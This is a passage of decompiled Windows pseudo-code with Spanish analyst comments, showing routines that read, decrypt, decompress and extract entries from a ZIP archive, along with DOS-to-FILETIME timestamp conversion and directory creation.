  if (iVar3 != 0) {
    param_1 = (char *)0xffffffff;
  }
  if (((local_c != local_90) || (local_10 != 0)) || (local_8 != 0)) {
    param_1 = (char *)0xffffff99;
  }
  iVar3 = FUN_00405e6b(pcVar1,&local_74);
  if (iVar3 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar3 = FUN_00405e6b(pcVar1,local_70);
  if (iVar3 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar3 = FUN_00405e27(pcVar1,&local_8c);
  if (iVar3 != 0) {
    param_1 = (char *)0xffffffff;
  }
  if ((uint)(*(int *)(pcVar1 + 0xc) + iVar2) < (uint)(local_74 + local_70[0])) {
    if (param_1 != (char *)0x0) goto LAB_00406112;
    param_1 = (char *)0xffffff99;
  }
  if (param_1 == (char *)0x0) {
    local_94 = pcVar1;
    local_18 = 0;
    local_88 = ((*(int *)(pcVar1 + 0xc) - local_74) - local_70[0]) + iVar2;
    pcVar1[0xc] = '\0';
    pcVar1[0xd] = '\0';
    pcVar1[0xe] = '\0';
    pcVar1[0xf] = '\0';
    local_78 = iVar2;
    puVar4 = malloc(0x80);
    ppcVar5 = &local_94;
    puVar6 = puVar4;
    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar6 = *ppcVar5;
      ppcVar5 = ppcVar5 + 1;
      puVar6 = puVar6 + 1;
    }
    FUN_004064e2(puVar4);
    return puVar4;
  }
LAB_00406112:
  FUN_00405c9f(pcVar1);
  return (undefined4 *)0x0;
}



/* Destruye el iterador ZIP y libera la entrada actualmente abierta. */
undefined4 __cdecl FUN_00406162(undefined4 *param_1)

{
  if (param_1 == (undefined4 *)0x0) {
    return 0xffffff9a;
  }
  if (param_1[0x1f] != 0) {
    FUN_00406a97((int)param_1);
  }
  FUN_00405c9f((void *)*param_1);
  free(param_1);
  return 0;
}



/* Descompone una marca de fecha/hora DOS en sus campos legibles. */
void __cdecl FUN_00406191(uint param_1,int *param_2)

{
  param_2[3] = param_1 >> 0x10 & 0x1f;
  param_2[5] = (param_1 >> 0x19) + 0x7bc;
  param_2[2] = param_1 >> 0xb & 0x1f;
  param_2[4] = (param_1 >> 0x15 & 0xf) - 1;
  param_2[1] = param_1 >> 5 & 0x3f;
  *param_2 = (param_1 & 0x1f) << 1;
  return;
}



/* Lee metadatos y, opcionalmente, el nombre, fecha y contenido de una entrada ZIP. */
int __cdecl
FUN_004061e0(undefined4 *param_1,int *param_2,int *param_3,void *param_4,uint param_5,void *param_6,
            uint param_7,void *param_8,uint param_9)

{
  undefined4 *puVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  undefined4 *puVar5;
  int *piVar6;
  int local_60 [4];
  uint local_50;
  int local_4c;
  int local_48;
  int local_44;
  undefined4 *local_40;
  uint local_3c;
  uint local_38;
  int local_34;
  int local_30;
  int local_2c;
  int local_28 [6];
  int local_10;
  int local_c;
  int local_8;
  
  puVar1 = param_1;
  local_8 = 0;
  if (param_1 == (undefined4 *)0x0) {
    return -0x66;
  }
  iVar2 = FUN_00405d0e((char *)*param_1,param_1[5] + param_1[3],0);
  if (iVar2 == 0) {
    iVar2 = FUN_00405e6b((char *)*param_1,&local_c);
    if (iVar2 == 0) {
      if (local_c != 0x2014b50) {
        local_8 = -0x67;
      }
    }
    else {
      local_8 = -1;
    }
  }
  else {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27((char *)*param_1,local_60);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27((char *)*param_1,local_60 + 1);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27((char *)*param_1,local_60 + 2);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27((char *)*param_1,local_60 + 3);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b((char *)*param_1,(int *)&local_50);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  FUN_00406191(local_50,local_28);
  iVar2 = FUN_00405e6b((char *)*param_1,&local_4c);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b((char *)*param_1,&local_48);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b((char *)*param_1,&local_44);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27((char *)*param_1,(int *)&local_40);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27((char *)*param_1,(int *)&local_3c);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27((char *)*param_1,(int *)&local_38);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27((char *)*param_1,&local_34);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27((char *)*param_1,&local_30);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b((char *)*param_1,&local_2c);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b((char *)*param_1,&local_10);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  puVar5 = local_40;
  if (local_8 == 0) {
    if (param_4 != (void *)0x0) {
      puVar5 = (undefined4 *)param_5;
      if (local_40 < param_5) {
        *(undefined1 *)((int)local_40 + (int)param_4) = 0;
        puVar5 = local_40;
      }
      if (((local_40 != (undefined4 *)0x0) && (param_5 != 0)) &&
         (uVar3 = FUN_00405d8a(param_4,(uint)puVar5,1,(char *)*param_1), uVar3 != 1)) {
        local_8 = -1;
      }
      puVar5 = (undefined4 *)((int)local_40 - (int)puVar5);
      if (local_8 != 0) goto LAB_00406435;
    }
    if (param_6 != (void *)0x0) {
      uVar3 = local_3c;
      if (param_7 <= local_3c) {
        uVar3 = param_7;
      }
      if (puVar5 != (undefined4 *)0x0) {
        iVar2 = FUN_00405d0e((char *)*param_1,(int)puVar5,1);
        if (iVar2 == 0) {
          param_1 = (undefined4 *)0x0;
          puVar5 = param_1;
        }
        else {
          local_8 = -1;
        }
      }
      param_1 = puVar5;
      if (((local_3c != 0) && (param_7 != 0)) &&
         (uVar4 = FUN_00405d8a(param_6,uVar3,1,(char *)*puVar1), uVar4 != 1)) {
        local_8 = -1;
      }
      iVar2 = (int)param_1 + (local_3c - uVar3);
      goto LAB_00406438;
    }
  }
LAB_00406435:
  iVar2 = (int)puVar5 + local_3c;
LAB_00406438:
  if (local_8 == 0) {
    if (param_8 != (void *)0x0) {
      uVar3 = param_9;
      if (local_38 < param_9) {
        *(undefined1 *)(local_38 + (int)param_8) = 0;
        uVar3 = local_38;
      }
      if ((iVar2 != 0) && (iVar2 = FUN_00405d0e((char *)*puVar1,iVar2,1), iVar2 != 0)) {
        local_8 = -1;
      }
      if (((local_38 != 0) && (param_9 != 0)) &&
         (uVar3 = FUN_00405d8a(param_8,uVar3,1,(char *)*puVar1), uVar3 != 1)) {
        local_8 = -1;
      }
      if (local_8 != 0) {
        return local_8;
      }
    }
    if (param_2 != (int *)0x0) {
      piVar6 = local_60;
      for (iVar2 = 0x14; iVar2 != 0; iVar2 = iVar2 + -1) {
        *param_2 = *piVar6;
        piVar6 = piVar6 + 1;
        param_2 = param_2 + 1;
      }
    }
    if (param_3 != (int *)0x0) {
      *param_3 = local_10;
    }
  }
  return local_8;
}



/* Variante de consulta de entrada que omite el tercer bloque de metadatos. */
void __cdecl
FUN_004064bb(undefined4 *param_1,int *param_2,void *param_3,uint param_4,void *param_5,uint param_6,
            void *param_7,uint param_8)

{
  FUN_004061e0(param_1,param_2,(int *)0x0,param_3,param_4,param_5,param_6,param_7,param_8);
  return;
}



/* Selecciona la primera entrada del directorio ZIP y la prepara para lectura. */
int __cdecl FUN_004064e2(undefined4 *param_1)

{
  int iVar1;
  
  if (param_1 == (undefined4 *)0x0) {
    iVar1 = -0x66;
  }
  else {
    param_1[5] = param_1[9];
    param_1[4] = 0;
    iVar1 = FUN_004061e0(param_1,param_1 + 10,param_1 + 0x1e,(void *)0x0,0,(void *)0x0,0,(void *)0x0
                         ,0);
    param_1[6] = (uint)(iVar1 == 0);
  }
  return iVar1;
}



/* Avanza a la siguiente entrada ZIP y actualiza sus offsets. */
int __cdecl FUN_00406520(undefined4 *param_1)

{
  int iVar1;
  
  if (param_1 == (undefined4 *)0x0) {
    iVar1 = -0x66;
  }
  else if ((param_1[6] == 0) || (param_1[4] + 1 == param_1[1])) {
    iVar1 = -100;
  }
  else {
    param_1[4] = param_1[4] + 1;
    param_1[5] = param_1[5] + param_1[0x14] + param_1[0x13] + 0x2e + param_1[0x12];
    iVar1 = FUN_004061e0(param_1,param_1 + 10,param_1 + 0x1e,(void *)0x0,0,(void *)0x0,0,(void *)0x0
                         ,0);
    param_1[6] = (uint)(iVar1 == 0);
  }
  return iVar1;
}



/* Valida la cabecera local y calcula offsets, tamaños y datos comprimidos. */
int __cdecl FUN_0040657a(undefined4 *param_1,int *param_2,int *param_3,int *param_4)

{
  int *piVar1;
  undefined4 *puVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  int local_10;
  int local_c;
  int local_8;
  
  piVar3 = param_2;
  puVar2 = param_1;
  iVar5 = 0;
  *param_2 = 0;
  *param_3 = 0;
  *param_4 = 0;
  iVar4 = FUN_00405d0e((char *)*param_1,param_1[3] + param_1[0x1e],0);
  if (iVar4 == 0) {
    iVar4 = FUN_00405e6b((char *)*puVar2,&local_c);
    if (iVar4 == 0) {
      if (local_c != 0x4034b50) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e27((char *)*puVar2,(int *)&param_2);
    if (iVar4 != 0) {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e27((char *)*puVar2,(int *)&param_1);
    if (iVar4 != 0) {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e27((char *)*puVar2,(int *)&param_2);
    if (iVar4 == 0) {
      if ((iVar5 == 0) &&
         ((piVar1 = (int *)puVar2[0xd], param_2 != piVar1 ||
          ((piVar1 != (int *)0x0 && (piVar1 != (int *)0x8)))))) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e6b((char *)*puVar2,(int *)&param_2);
    if (iVar4 != 0) {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e6b((char *)*puVar2,(int *)&param_2);
    if (iVar4 == 0) {
      if (((iVar5 == 0) && (param_2 != (int *)puVar2[0xf])) && (((uint)param_1 & 8) == 0)) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e6b((char *)*puVar2,(int *)&param_2);
    if (iVar4 == 0) {
      if (((iVar5 == 0) && (param_2 != (int *)puVar2[0x10])) && (((uint)param_1 & 8) == 0)) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e6b((char *)*puVar2,(int *)&param_2);
    if (iVar4 == 0) {
      if (((iVar5 == 0) && (param_2 != (int *)puVar2[0x11])) && (((uint)param_1 & 8) == 0)) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e27((char *)*puVar2,&local_8);
    if (iVar4 == 0) {
      if ((iVar5 == 0) && (local_8 != puVar2[0x12])) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    *piVar3 = *piVar3 + local_8;
    iVar4 = FUN_00405e27((char *)*puVar2,&local_10);
    if (iVar4 != 0) {
      iVar5 = -1;
    }
    *param_3 = puVar2[0x1e] + 0x1e + local_8;
    *param_4 = local_10;
    *piVar3 = *piVar3 + local_10;
  }
  else {
    iVar5 = -1;
  }
  return iVar5;
}



/* Abre la entrada actual, inicializa descompresion y aplica el estado de flujo. */
undefined4 __cdecl FUN_0040671d(undefined4 *param_1,byte *param_2)

{
  undefined1 uVar1;
  int iVar2;
  undefined4 *_Memory;
  void *pvVar3;
  undefined4 uVar4;
  int local_10;
  int local_c;
  int local_8;
  
  if ((param_1 == (undefined4 *)0x0) || (param_1[6] == 0)) {
    uVar4 = 0xffffff9a;
  }
  else {
    if (param_1[0x1f] != 0) {
      FUN_00406a97((int)param_1);
    }
    iVar2 = FUN_0040657a(param_1,&local_10,&local_8,&local_c);
    if (iVar2 == 0) {
      _Memory = malloc(0x84);
      if (_Memory != (undefined4 *)0x0) {
        pvVar3 = malloc(0x4000);
        *_Memory = pvVar3;
        _Memory[0x11] = local_8;
        _Memory[0x12] = local_c;
        _Memory[0x13] = 0;
        if (pvVar3 != (void *)0x0) {
          _Memory[0x10] = 0;
          iVar2 = param_1[0xd];
          _Memory[0x15] = param_1[0xf];
          _Memory[0x14] = 0;
          _Memory[0x19] = param_1[0xd];
          _Memory[0x18] = *param_1;
          _Memory[0x1a] = param_1[3];
          _Memory[6] = 0;
          if (iVar2 != 0) {
            _Memory[9] = 0;
            _Memory[10] = 0;
            _Memory[0xb] = 0;
            iVar2 = FUN_00405777((int)(_Memory + 1));
            if (iVar2 == 0) {
              _Memory[0x10] = 1;
            }
          }
          _Memory[0x16] = param_1[0x10];
          _Memory[0x17] = param_1[0x11];
          *(byte *)(_Memory + 0x1b) = *(byte *)(param_1 + 0xc) & 1;
          if (((uint)param_1[0xc] >> 3 & 1) == 0) {
            uVar1 = (undefined1)((uint)param_1[0xf] >> 0x18);
          }
          else {
            uVar1 = (undefined1)((uint)param_1[0xe] >> 8);
          }
          *(undefined1 *)(_Memory + 0x20) = uVar1;
          _Memory[0x1d] = 0x23456789;
          _Memory[0x1f] = -(uint)(*(char *)(_Memory + 0x1b) != '\0') & 0xc;
          _Memory[0x1c] = 0x12345678;
          _Memory[0x1e] = 0x34567890;
          for (; (param_2 != (byte *)0x0 && (*param_2 != 0)); param_2 = param_2 + 1) {
            FUN_00405535(_Memory + 0x1c,*param_2);
          }
          iVar2 = param_1[0x1e];
          _Memory[2] = 0;
          _Memory[0xf] = iVar2 + 0x1e + local_10;
          param_1[0x1f] = _Memory;
          return 0;
        }
        free(_Memory);
      }
      uVar4 = 0xffffff98;
    }
    else {
      uVar4 = 0xffffff99;
    }
  }
  return uVar4;
}



/* Lee y descomprime hasta llenar el buffer de salida o finalizar la entrada. */
uint __cdecl FUN_00406880(uint param_1,int param_2,uint param_3,undefined1 *param_4)

{
  int *piVar1;
  char cVar2;
  int *piVar3;
  byte *pbVar4;
  byte bVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  uint local_c;
  uint local_8;
  
  local_c = 0;
  local_8 = 0;
  if (param_4 != (undefined1 *)0x0) {
    *param_4 = 0;
  }
  if ((param_1 == 0) || (piVar3 = *(int **)(param_1 + 0x7c), piVar3 == (int *)0x0)) {
    local_8 = 0xffffff9a;
  }
  else if (*piVar3 == 0) {
    local_8 = 0xffffff9c;
  }
  else if (param_3 == 0) {
LAB_00406a75:
    local_8 = 0;
  }
  else {
    piVar3[5] = param_3;
    piVar3[4] = param_2;
    if ((uint)piVar3[0x17] < param_3) {
      piVar3[5] = piVar3[0x17];
    }
    if (piVar3[5] != 0) {
      do {
        if ((piVar3[2] == 0) && (uVar7 = piVar3[0x16], uVar7 != 0)) {
          uVar8 = 0x4000;
          if ((uVar7 < 0x4000) && (uVar8 = uVar7, uVar7 == 0)) {
            if (param_4 != (undefined1 *)0x0) {
              *param_4 = 1;
            }
            goto LAB_00406a75;
          }
          iVar6 = FUN_00405d0e((char *)piVar3[0x18],piVar3[0x1a] + piVar3[0xf],0);
          if ((iVar6 != 0) ||
             (uVar7 = FUN_00405d8a((void *)*piVar3,uVar8,1,(char *)piVar3[0x18]), uVar7 != 1)) {
            return 0xffffffff;
          }
          piVar3[0xf] = piVar3[0xf] + uVar8;
          piVar3[0x16] = piVar3[0x16] - uVar8;
          iVar6 = *piVar3;
          piVar3[1] = iVar6;
          piVar3[2] = uVar8;
          if (((char)piVar3[0x1b] != '\0') && (param_1 = 0, uVar8 != 0)) {
            do {
              bVar5 = FUN_004055a3((uint *)(piVar3 + 0x1c),*(byte *)(param_1 + iVar6));
              uVar7 = param_1 + 1;
              *(byte *)(param_1 + iVar6) = bVar5;
              param_1 = uVar7;
            } while (uVar7 < uVar8);
          }
        }
        uVar7 = piVar3[2];
        uVar8 = piVar3[0x1f];
        if (uVar7 < (uint)piVar3[0x1f]) {
          uVar8 = uVar7;
        }
        if (uVar8 != 0) {
          cVar2 = *(char *)(piVar3[1] + -1 + uVar8);
          piVar1 = piVar3 + 0x1f;
          *piVar1 = *piVar1 - uVar8;
          piVar3[2] = uVar7 - uVar8;
          piVar3[1] = piVar3[1] + uVar8;
          if ((*piVar1 == 0) && (cVar2 != (char)piVar3[0x20])) {
            return 0xffffff96;
          }
        }
        if (piVar3[0x19] == 0) {
          uVar7 = piVar3[2];
          if ((uint)piVar3[5] < (uint)piVar3[2]) {
            uVar7 = piVar3[5];
          }
          uVar8 = 0;
          if (uVar7 != 0) {
            do {
              *(undefined1 *)(piVar3[4] + uVar8) = *(undefined1 *)(piVar3[1] + uVar8);
              uVar8 = uVar8 + 1;
            } while (uVar8 < uVar7);
          }
          uVar8 = FUN_0040541f(piVar3[0x14],(byte *)piVar3[4],uVar7);
          piVar3[0x17] = piVar3[0x17] - uVar7;
          piVar3[2] = piVar3[2] - uVar7;
          piVar3[5] = piVar3[5] - uVar7;
          piVar3[4] = piVar3[4] + uVar7;
          piVar3[1] = piVar3[1] + uVar7;
          piVar3[6] = piVar3[6] + uVar7;
          local_8 = local_8 + uVar7;
          piVar3[0x14] = uVar8;
          if ((piVar3[0x17] == 0) && (param_4 != (undefined1 *)0x0)) {
            *param_4 = 1;
          }
        }
        else {
          pbVar4 = (byte *)piVar3[4];
          iVar6 = piVar3[6];
          local_c = FUN_0040583c(piVar3 + 1,2);
          uVar8 = piVar3[6] - iVar6;
          uVar7 = FUN_0040541f(piVar3[0x14],pbVar4,uVar8);
          piVar3[0x17] = piVar3[0x17] - uVar8;
          local_8 = local_8 + uVar8;
          piVar3[0x14] = uVar7;
          if ((local_c == 1) || (piVar3[0x17] == 0)) {
            if (param_4 == (undefined1 *)0x0) {
              return local_8;
            }
            *param_4 = 1;
            return local_8;
          }
          if (local_c != 0) {
            return local_c;
          }
        }
      } while (piVar3[5] != 0);
      if (local_c != 0) {
        return local_c;
      }
    }
  }
  return local_8;
}



/* Cierra el flujo de descompresion, libera buffers y limpia el estado. */
undefined4 __cdecl FUN_00406a97(int param_1)

{
  undefined4 *_Memory;
  undefined4 local_4;
  
  local_4 = 0;
  if ((param_1 == 0) || (_Memory = *(undefined4 **)(param_1 + 0x7c), _Memory == (undefined4 *)0x0))
  {
    local_4 = 0xffffff9a;
  }
  else {
    if ((_Memory[0x17] == 0) && (_Memory[0x14] != _Memory[0x15])) {
      local_4 = 0xffffff97;
    }
    if ((void *)*_Memory != (void *)0x0) {
      free((void *)*_Memory);
      *_Memory = 0;
    }
    *_Memory = 0;
    if (_Memory[0x10] != 0) {
      FUN_00405739((int)(_Memory + 1));
    }
    _Memory[0x10] = 0;
    free(_Memory);
    *(undefined4 *)(param_1 + 0x7c) = 0;
  }
  return local_4;
}



/* Convierte una marca de tiempo DOS/Windows a unidades FILETIME. */
longlong __cdecl FUN_00406b02(uint param_1)

{
  longlong lVar1;
  
  lVar1 = __allmul(param_1 + 0xb6109100,((int)param_1 >> 0x1f) + 2 + (uint)(0x49ef6eff < param_1),
                   10000000,0);
  return lVar1;
}



/* Convierte campos de fecha y hora DOS a FILETIME. */
_FILETIME __cdecl FUN_00406b23(uint param_1,uint param_2)

{
  SYSTEMTIME local_1c;
  _FILETIME local_c;
  
  local_1c.wMilliseconds = 0;
  local_1c.wYear = ((ushort)param_1 >> 9) + 0x7bc;
  local_1c.wDay = (ushort)param_1 & 0x1f;
  local_1c.wMonth = (ushort)(param_1 >> 5) & 0xf;
  local_1c.wHour = (ushort)param_2 >> 0xb;
  local_1c.wSecond = (WORD)((param_2 & 0x1f) << 1);
  local_1c.wMinute = (ushort)(param_2 >> 5) & 0x3f;
  SystemTimeToFileTime(&local_1c,&local_c);
  return local_c;
}



/* Abre un archivo o entrada ZIP y devuelve un contexto de iteracion. */
int * __thiscall FUN_00406b8e(void *this,LPCSTR param_1,undefined4 param_2,int param_3)

{
  char cVar1;
  size_t sVar2;
  DWORD DVar3;
  char *pcVar4;
  undefined4 *puVar5;
  int *local_8;
  
  if ((*(int *)this == 0) && (*(int *)((int)this + 4) == -1)) {
    pcVar4 = (char *)((int)this + 0x140);
    local_8 = this;
    GetCurrentDirectoryA(0x104,pcVar4);
    sVar2 = strlen(pcVar4);
    cVar1 = *(char *)(sVar2 + 0x13f + (int)this);
    if ((cVar1 != '\\') && (cVar1 != '/')) {
      strcat(pcVar4,(char *)&_Source_0040f818);
    }
    if ((param_3 == 1) && (DVar3 = SetFilePointer(param_1,0,(PLONG)0x0,1), DVar3 == 0xffffffff)) {
      local_8 = (int *)0x2000000;
    }
    else {
      pcVar4 = FUN_00405bae(param_1,param_2,param_3,&local_8);
      if (pcVar4 != (char *)0x0) {
        puVar5 = FUN_00405fe2(pcVar4);
        *(undefined4 **)this = puVar5;
        local_8 = (int *)((-(uint)(puVar5 != (undefined4 *)0x0) & 0xfffffe00) + 0x200);
      }
    }
  }
  else {
    local_8 = (int *)0x1000000;
  }
  return local_8;
}



/* Obtiene metadatos de una entrada ZIP y normaliza su nombre y marcas de tiempo. */
undefined4 __thiscall FUN_00406c40(void *this,int param_1,undefined4 *param_2)

{
  undefined1 *puVar1;
  uchar uVar2;
  undefined4 *_Src;
  void *pvVar3;
  byte bVar4;
  int iVar5;
  uint uVar6;
  uchar *puVar7;
  int iVar8;
  byte bVar9;
  byte bVar10;
  uchar *_Str;
  longlong lVar11;
  uchar local_284 [260];
  char local_180 [260];
  uint local_7c [4];
  uint local_6c;
  undefined4 local_64;
  undefined4 local_60;
  uint local_48;
  int local_2c;
  _FILETIME local_28;
  _FILETIME local_20;
  void *local_18;
  int local_14;
  uint local_10;
  undefined4 local_c;
  byte local_5;
  
  _Src = param_2;
  if ((param_1 < -1) || (*(int *)(*(int *)this + 4) <= param_1)) {
    return 0x10000;
  }
  local_18 = this;
  if (*(int *)((int)this + 4) != -1) {
    FUN_00406a97(*(int *)this);
  }
  *(undefined4 *)((int)this + 4) = 0xffffffff;
  if (param_1 == *(int *)((int)this + 0x134)) {
    if (param_1 != -1) {
      memcpy(param_2,(void *)((int)this + 8),300);
      return 0;
    }
  }
  else if (param_1 != -1) {
    if (param_1 < (int)(*(undefined4 **)this)[4]) {
      FUN_004064e2(*(undefined4 **)this);
    }
    while ((int)(*(undefined4 **)this)[4] < param_1) {
      FUN_00406520(*(undefined4 **)this);
    }
    FUN_004064bb(*(undefined4 **)this,(int *)local_7c,local_180,0x104,(void *)0x0,0,(void *)0x0,0);
    iVar5 = FUN_0040657a(*(undefined4 **)this,&local_2c,&local_14,(int *)&local_10);
    if (iVar5 != 0) {
      return 0x700;
    }
    iVar5 = FUN_00405d0e((char *)**(undefined4 **)this,local_14,0);
    if (iVar5 == 0) {
      local_c = operator_new(local_10);
      uVar6 = FUN_00405d8a(local_c,1,local_10,(char *)**(undefined4 **)this);
      if (uVar6 == local_10) {
        *param_2 = *(undefined4 *)(*(int *)this + 0x10);
        strcpy((char *)local_284,local_180);
        _Str = local_284;
        while( true ) {
          while( true ) {
            for (; (uVar2 = *_Str, uVar2 != '\0' && (_Str[1] == ':')); _Str = _Str + 2) {
            }
            if ((uVar2 != '\\') && (uVar2 != '/')) break;
            _Str = _Str + 1;
          }
          puVar7 = _mbsstr(_Str,(uchar *)&_Substr_0040f838);
          if ((puVar7 == (uchar *)0x0) &&
             (((puVar7 = _mbsstr(_Str,(uchar *)&_Substr_0040f830), puVar7 == (uchar *)0x0 &&
               (puVar7 = _mbsstr(_Str,(uchar *)&_Substr_0040f828), puVar7 == (uchar *)0x0)) &&
              (puVar7 = _mbsstr(_Str,(uchar *)&_Substr_0040f820), puVar7 == (uchar *)0x0)))) break;
          _Str = puVar7 + 4;
        }
        strcpy((char *)(param_2 + 1),(char *)_Str);
        param_2._3_1_ = 0;
        local_5 = 0;
        bVar9 = ~(byte)(local_48 >> 0x17);
        bVar4 = (byte)(local_48 >> 0x1e);
        local_7c[0] = local_7c[0] >> 8;
        bVar10 = 1;
        if ((((local_7c[0] == 0) || (local_7c[0] == 7)) || (local_7c[0] == 0xb)) ||
           (local_7c[0] == 0xe)) {
          bVar9 = (byte)local_48;
          param_2._3_1_ = (byte)(local_48 >> 1) & 1;
          local_5 = (byte)(local_48 >> 2) & 1;
          bVar4 = (byte)(local_48 >> 4);
          bVar10 = (byte)(local_48 >> 5) & 1;
        }
        iVar5 = 0;
        _Src[0x42] = 0;
        if ((bVar4 & 1) != 0) {
          _Src[0x42] = 0x10;
        }
        if (bVar10 != 0) {
          _Src[0x42] = _Src[0x42] | 0x20;
        }
        if (param_2._3_1_ != 0) {
          _Src[0x42] = _Src[0x42] | 2;
        }
        if ((bVar9 & 1) != 0) {
          _Src[0x42] = _Src[0x42] | 1;
        }
        if (local_5 != 0) {
          _Src[0x42] = _Src[0x42] | 4;
        }
        _Src[0x49] = local_64;
        _Src[0x4a] = local_60;
        local_28 = FUN_00406b23(local_6c >> 0x10,local_6c);
        LocalFileTimeToFileTime(&local_28,&local_20);
        pvVar3 = local_c;
        _Src[0x43] = local_20.dwLowDateTime;
        _Src[0x45] = local_20.dwLowDateTime;
        _Src[0x47] = local_20.dwLowDateTime;
        _Src[0x44] = local_20.dwHighDateTime;
        _Src[0x46] = local_20.dwHighDateTime;
        _Src[0x48] = local_20.dwHighDateTime;
        if (4 < local_10) {
          do {
            uVar6 = (uint)local_c >> 0x10;
            local_c._0_2_ =
                 CONCAT11(*(undefined1 *)((int)pvVar3 + iVar5 + 1),
                          *(undefined1 *)(iVar5 + (int)pvVar3));
            local_c = (void *)(CONCAT22((short)uVar6,(undefined2)local_c) & 0xff00ffff);
            bVar9 = *(byte *)((int)pvVar3 + iVar5 + 2);
            iVar8 = strcmp((char *)&local_c,(char *)&_Str2_0040f81c);
            if (iVar8 == 0) {
              bVar9 = *(byte *)(iVar5 + 4 + (int)pvVar3);
              local_5 = bVar9 >> 2 & 1;
              iVar8 = iVar5 + 5;
              if ((bVar9 & 1) != 0) {
                puVar1 = (undefined1 *)(iVar8 + (int)pvVar3);
                iVar8 = iVar5 + 9;
                lVar11 = FUN_00406b02(CONCAT31(CONCAT21(*(undefined2 *)(puVar1 + 2),
                                                        *(undefined1 *)(iVar5 + 6 + (int)pvVar3)),
                                               *puVar1));
                *(longlong *)(_Src + 0x47) = lVar11;
              }
              if ((bVar9 >> 1 & 1) != 0) {
                iVar5 = iVar8 + 1;
                puVar1 = (undefined1 *)(iVar8 + (int)pvVar3);
                iVar8 = iVar8 + 4;
                lVar11 = FUN_00406b02(CONCAT31(CONCAT21(*(undefined2 *)(puVar1 + 2),
                                                        *(undefined1 *)(iVar5 + (int)pvVar3)),
                                               *puVar1));
                *(longlong *)(_Src + 0x43) = lVar11;
              }
              if (local_5 != 0) {
                lVar11 = FUN_00406b02(CONCAT31(CONCAT21(*(undefined2 *)
                                                         ((undefined1 *)(iVar8 + (int)pvVar3) + 2),
                                                        *(undefined1 *)(iVar8 + 1 + (int)pvVar3)),
                                               *(undefined1 *)(iVar8 + (int)pvVar3)));
                *(longlong *)(_Src + 0x45) = lVar11;
              }
              break;
            }
            iVar5 = iVar5 + 4 + (uint)bVar9;
          } while (iVar5 + 4U < local_10);
        }
        if (pvVar3 != (void *)0x0) {
          operator_delete(pvVar3);
        }
        pvVar3 = local_18;
        memcpy((void *)((int)local_18 + 8),_Src,300);
        *(int *)((int)pvVar3 + 0x134) = param_1;
        return 0;
      }
      operator_delete(local_c);
    }
    return 0x800;
  }
  *param_2 = *(undefined4 *)(*(int *)this + 4);
  *(undefined1 *)(param_2 + 1) = 0;
  param_2[0x42] = 0;
  param_2[0x43] = 0;
  param_2[0x44] = 0;
  param_2[0x45] = 0;
  param_2[0x46] = 0;
  param_2[0x47] = 0;
  param_2[0x48] = 0;
  param_2[0x49] = 0;
  param_2[0x4a] = 0;
  return 0;
}



/* Crea recursivamente los directorios necesarios para una ruta extraida. */
void __cdecl FUN_00407070(LPCSTR param_1,char *param_2)

{
  char cVar1;
  DWORD DVar2;
  char *pcVar3;
  char *pcVar4;
  char local_20c [260];
  char local_108 [260];
  
  if ((param_1 != (LPCSTR)0x0) && (DVar2 = GetFileAttributesA(param_1), DVar2 == 0xffffffff)) {
    CreateDirectoryA(param_1,(LPSECURITY_ATTRIBUTES)0x0);
  }
  cVar1 = *param_2;
  pcVar3 = param_2;
  pcVar4 = param_2;
  if (cVar1 != '\0') {
    do {
      if ((cVar1 == '/') || (cVar1 == '\\')) {
        pcVar4 = pcVar3;
      }
      cVar1 = pcVar3[1];
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
    if (pcVar4 != param_2) {
      memcpy(local_20c,param_2,(int)pcVar4 - (int)param_2);
      local_20c[(int)pcVar4 - (int)param_2] = '\0';
      FUN_00407070(param_1,local_20c);
    }
    local_108[0] = '\0';
    if (param_1 != (LPCSTR)0x0) {
      strcpy(local_108,param_1);
    }
    strcat(local_108,param_2);
    DVar2 = GetFileAttributesA(local_108);
    if (DVar2 == 0xffffffff) {
      CreateDirectoryA(local_108,(LPSECURITY_ATTRIBUTES)0x0);
    }
  }
  return;
}



/* Extrae una entrada: crea directorios, descifra/descomprime y escribe el archivo. */
int __thiscall FUN_00407136(void *this,char *param_1,char *param_2,uint param_3,int param_4)

{
  char *pcVar1;
  undefined4 *puVar2;
  int iVar3;
  char cVar4;
  char *pcVar5;
  void *pvVar6;
